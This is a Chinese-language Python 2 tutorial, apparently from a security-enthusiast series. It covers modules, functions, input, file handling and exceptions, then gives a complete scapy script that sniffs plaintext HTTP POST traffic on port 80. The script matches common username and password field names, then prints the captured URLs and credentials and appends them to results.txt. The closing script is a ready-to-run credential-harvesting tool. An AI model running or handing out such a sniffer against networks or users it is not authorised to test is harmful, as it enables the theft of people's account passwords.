明文密码嗅探

Python安全爱好者专题

简介

撸完上一期文章，我们最关心的账号密码，在网络流量中如何提取账号密码呢？
我们继续来撸一个明文密码嗅探脚本（见文章末尾）。

模块

导入模块，语法如下：

import datetime    # 导入datetime库

print datetime.datetime.now().year    # 打印当前年份
# 2018

使用from导入模块中某一指定内容，语法如下：

from scapy.all import ARP

或者把一个模块的所有内容都导入，如下：

from scapy.all import *

函数

语法：

def 函数名(参数列表):
    函数体

实例：

def printme( str ):
   "打印传入的字符串到标准显示设备上"
   print str
   return

函数调用

printme("我要调用用户自定义函数!")
# 我要调用用户自定义函数!

文件I/O操作

输入：

  • raw_input函数

raw_input() 函数从标准输入读取一个行，并返回一个字符串（去掉结尾的换行符）：

str = raw_input("请输入：")
print "你输入的内容是: ", str
# 请输入：Hello Python！
# 你输入的内容是:  Hello Python！

  • input函数

input() 函数和 raw_input() 函数基本类似，但是 input 可以接收一个Python表达式作为输入，并将运算结果返回。

str = input("请输入：")
print "你输入的内容是: ", str
# 请输入：[x*5 for x in range(2,10,2)]
# 你输入的内容是:  [10, 20, 30, 40]

文件操作：

  • 写文件

with open('results.txt', 'a') as f:    # 打开一个文件，创建file对象。'a'表示打开一个文件追加内容。
    url = 'URL: '
    info = 'INFO: '
    f.write(url + '\n')    # 写入url
    f.write(info + '\n')
# 当前文件夹下生成一个results.txt文件，并在文件中写入如下内容
# URL: 
# INFO: 

Python中with会自动释放对象，还可以很好的处理上下文环境产生的异常。

  • 读取文件中的内容

fo = open('results.txt', 'r')    # 读取文件中的内容
for line in fo.readlines():
    print line
# URL: 

# INFO: 

fo.close()    # 关闭打开的文件

这种写法存在一个两个问题：

  1. 可能会忘记关闭文件

  2. 文件读取数据发生异常，没有进行任何处理。

因此，Python的with语句是提供一个有效的机制，让代码更简练，同时在异常产生时，清理工作更简单。

异常处理

捕捉异常可以使用try/except语句。

try:
    adapter = sys.argv[2]
    if args.interface:    # import argparse，-i参数(下面例子中出现)
        try:
            sniff(iface=adapter, filter='tcp port 80', prn=passwd_callback, store=0, count=1000)    # scapy库中sniff方法，嗅探80端口
        except scapy.error.Scapy_Exception:    # Scapy的异常处理
            print 'Please select the right adapter.\n'
            print parser.print_help()
            sys.exit()
except IndexError:    # 异常，序列中没有此索引
    print parser.print_help()
    sys.exit()

try的工作原理是，当开始一个try语句后，python就在当前程序的上下文中作标记，这样当异常出现时就可以回到这里，try子句先执行，接下来会发生什么依赖于执行时是否出现异常。

一个简单的嗅探明文密码例子

# -*-coding:UTF-8-*-
from scapy_http.http import HTTPRequest
from scapy.all import *

import argparse
import time
import sys
import os


def passwd_callback(packet):

    userNamePatternList = ['user', 'username', 'userid', 'useremail', 'mail', 'account', 'txtusername', 'txtusercode', 'textbox1', 'name', 'j_username', 'txtid']
    passwordPatternList = ['pass', 'password', 'txtpassword', 'pwd', 'txtpwd', 'textbox2', 'userpass', 'j_password']

    if HTTPRequest in packet:
        passwd_packet = packet[TCP].payload
        if passwd_packet.Method == 'POST':
            headers, body = str(passwd_packet).split("\r\n\r\n", 1)
            PatternList = userNamePatternList + passwordPatternList

            resutls = {}
            for pattern in PatternList:         # 获取流量中的关键字段
                if pattern in body.lower():
                    path = "{0}?".format(passwd_packet.Path) if passwd_packet.Path[-1:] != "?" else passwd_packet.Path
                    link = "http://{0}{1}{2}".format(passwd_packet.Host, path, body)
                    resutls[link] = body

            for key, values in resutls.items():
                print 'URL:', key
                print 'INFO:', values
                print '-' * 100
                with open('results.txt', 'a') as f:    # 写入results.txt
                    url = 'URL: ' + key
                    info = 'INFO: ' + values
                    f.write(url + '\n')
                    f.write(info + '\n')
                    f.write('-' * 100 + '\n')


def main():
    # 定义参数
    parser = argparse.ArgumentParser(
        prog='sniffer.py',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=''
    )

    parser.add_argument('-i', '--interface', help='Sniffing in live', metavar='Adapter')
    parser.add_argument('-V', '--version', help='display the version', action='version', version='%(prog)s 1.0.0')
    args = parser.parse_args()

    try:
        adapter = sys.argv[2]
        if args.interface:
            try:
                sniff(iface=adapter, filter='tcp port 80', prn=passwd_callback, store=0, count=1000)
            except scapy.error.Scapy_Exception:
                print 'Please select the right adapter.\n'
                print parser.print_help()
                sys.exit()
    except IndexError:
        print parser.print_help()
        sys.exit()

    print 'wait 1s...'
    time.sleep(1)


if __name__ == '__main__':
    main()
